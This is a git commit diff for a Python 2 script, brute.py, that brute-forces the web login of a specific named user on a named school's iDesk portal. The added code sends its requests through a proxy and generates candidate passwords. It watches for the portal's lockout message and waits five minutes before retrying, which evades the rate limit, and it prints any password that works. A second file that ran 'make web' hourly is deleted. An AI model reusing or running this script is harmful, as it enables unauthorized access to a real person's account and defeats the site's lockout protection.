6cf2cf54352b4ff14dd9ee3580e4176040e02673
patrickzyolo <patrick@kappa-mm.de>
2014-11-02 19:42:04 +0100

    check in

--- python/brute.py
+++ python/brute.py
@@ -1,7 +1,14 @@
+#!/usr/bin/python
 import cookielib
 import urllib
 import urllib2
 import itertools
+import time
+
+proxy = urllib2.ProxyHandler({'http': '192.168.0.26:8118'})
+opener = urllib2.build_opener(proxy)
+urllib2.install_opener(opener)
+authentication_url = 'https://goethe-schule-harburg.de/idesk/'
 
 def login(passwd):
 	cj = cookielib.CookieJar()
@@ -10,8 +17,6 @@ def login(passwd):
 	#opener.addheaders = [('User-agent', 'RedditTesting')]
 	user = 'patrick.zierahn'
 	urllib2.install_opener(opener)
-
-	authentication_url = 'https://goethe-schule-harburg.de/idesk/'
 
 	payload = {
 	  'login_act': 'patrick.zierahn',
@@ -22,7 +27,7 @@ def login(passwd):
 	req = urllib2.Request(authentication_url, data)
 
 	resp = urllib2.urlopen(req)
-	contents = resp.readlines()
+	contents = resp.read()
 	return contents
 
 def bruteforce(charset, maxlength):
@@ -30,10 +35,27 @@ def bruteforce(charset, maxlength):
         for candidate in itertools.chain.from_iterable(itertools.product(charset, repeat=i)
         for i in range(maxlength, maxlength + 1)))
 
-for i in list(bruteforce('abl213', 5)):
-	print "check", "blab" + i
-	log = login("blab" + i)
-	if len(log) == 15:
-		print "passwort:"
-		print i
+last = ""
+for i in list(bruteforce('213ab', 4)):
+	print "check -->", "blabl" + i
+	log = login("blabl" + i)
+#	for x in log:
+	
+	if "Zu viele Fehlversuche!" in log:
+		while("Zu viele Fehlversuche!" in login("blabl" + i)):
+			print "Gesperrt"
+			time.sleep(300)
+
+	if "Zu viele Fehlversuche!" not in log and "Anmeldung fehlgeschlagen!" not in log:
+		print "password -->", "\033[91m%s\033[0m" % ("blabl" + i)
 		exit()
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
--- spon/web.py
+++
@@ -1,8 +0,0 @@
-#!/usr/bin/python
-import os
-import time
-
-while(True):
-	os.popen("make web").readlines()
-	time.sleep(3600)
-#	time.sleep(6200)
